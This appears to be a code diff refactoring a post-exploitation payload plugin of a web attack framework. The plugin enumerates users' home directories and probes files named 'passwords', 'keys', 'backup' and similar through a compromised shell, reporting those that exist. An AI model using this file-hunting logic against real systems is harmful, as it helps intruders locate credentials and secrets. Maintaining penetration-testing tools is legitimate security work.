@@ -1,15 +1,14 @@
-from plugins.attack.payloads.base_payload import base_payload
-from core.ui.consoleUi.tables import table
+from plugins.attack.payloads.base_payload import Payload
+from core.ui.console.tables import table
 
 
-class interesting_files(base_payload):
+class interesting_files(Payload):
     '''
-    Search for interesting files in all known directories. 
+    Search for interesting files in all known directories.
     '''
-    def api_read(self, parameters):
-        result = {}
-        user_config_files = []
+    KNOWN_FALSE_POSITIVES = set(['/bin/pwd', ])
 
+    def _file_path_generator(self):
         interesting_extensions = []
         interesting_extensions.append('')   # no extension
         interesting_extensions.append('.txt')
@@ -28,7 +27,7 @@ class interesting_files(base_payload):
         interesting_extensions.append('.tar')
         interesting_extensions.append('.tar.gz')
         interesting_extensions.append('.pgp')
-        
+
         file_list = []
         file_list.append('backup')
         file_list.append('passwords')
@@ -44,11 +43,9 @@ class interesting_files(base_payload):
         file_list.append('keys')
         file_list.append('permissions')
         file_list.append('perm')
-                
+
         users_result = self.exec_payload('users')
 
-        files_to_read = []
-        
         #
         #    Create the list of files
         #
@@ -58,30 +55,31 @@ class interesting_files(base_payload):
             for interesting_file in file_list:
                 for extension in interesting_extensions:
                     file_fp = home + interesting_file + extension
-                    files_to_read.append( file_fp )
-        
-        #
-        #    Read the files
-        #    
-        for file_fp in files_to_read:
-            content = self.shell.read(file_fp)
-            if content:
-                result[ file_fp ] = content
+                    yield file_fp
+
+    def api_read(self):
+        result = {}
+
+        file_path_iter = self._file_path_generator()
+
+        for file_fp, content in self.read_multi(file_path_iter):
+            if content and file_fp not in self.KNOWN_FALSE_POSITIVES:
+                result[file_fp] = None
+
         return result
-        
-    def run_read(self, parameters):
-        api_result = self.api_read( parameters )
-                
+
+    def run_read(self):
+        api_result = self.api_read()
+
         if not api_result:
             return 'No interesting files found.'
         else:
             rows = []
-            rows.append( ['Interesting files',] )
-            rows.append( [] )
+            rows.append(['Interesting files', ])
+            rows.append([])
             for filename in api_result:
-                rows.append( [filename,] )
-                    
-            result_table = table( rows )
-            result_table.draw( 80 )
+                rows.append([filename, ])
+
+            result_table = table(rows)
+            result_table.draw(80)
             return rows
-        
